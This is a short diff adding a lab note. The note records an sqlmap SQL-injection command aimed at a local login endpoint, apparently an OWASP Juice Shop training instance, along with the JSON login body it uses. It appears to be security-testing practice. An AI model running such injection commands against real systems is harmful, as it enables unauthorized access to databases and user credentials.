@@ -1,0 +1,3 @@
+http://localhost:3000/rest/user/login (POST)  # /nix/store/15a1nygxw0yg14a6p7ian0ldv2yqdlj0-python3.14-sqlmap-1.10.8/bin/sqlmap -u http://localhost:3000/rest/user/login --data={\"email\":\"test@juice.local\",\"password\":\"test\"} -p email --ignore-code=401 --batch --level=3 --risk=3 --technique=B --dbms=sqlite --banner --flush-session --output-dir=sqlmap_out
+
+{"email":"test@juice.local","password":"test"}
